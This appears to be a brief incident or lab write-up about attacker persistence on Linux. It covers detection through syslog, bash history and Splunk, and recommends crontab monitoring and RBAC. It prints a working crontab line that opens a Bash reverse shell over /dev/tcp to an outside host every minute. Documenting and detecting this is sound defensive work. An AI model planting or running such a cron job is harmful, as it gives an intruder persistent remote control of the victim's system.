🧪 Summary:
A crontab entry was created by the attacker to maintain persistence using a Bash reverse shell triggered every minute.

📜 Cron Entry:
*/1 * * * * bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'

🔍 Detection:

syslog showed cron trigger logs.

.bash_history recorded the crontab -e command.

Splunk queries identified both creation and execution of the malicious job.

📸 Evidence:

Screenshot of the cron job being set

Reverse shell detection via /dev/tcp pattern

.bash_history revealing command entry

🛡️ Recommendation:

Implement crontab monitoring alerts

Restrict crontab usage via RBAC

Monitor for scheduled jobs that use suspicious syntax or outbound TCP calls
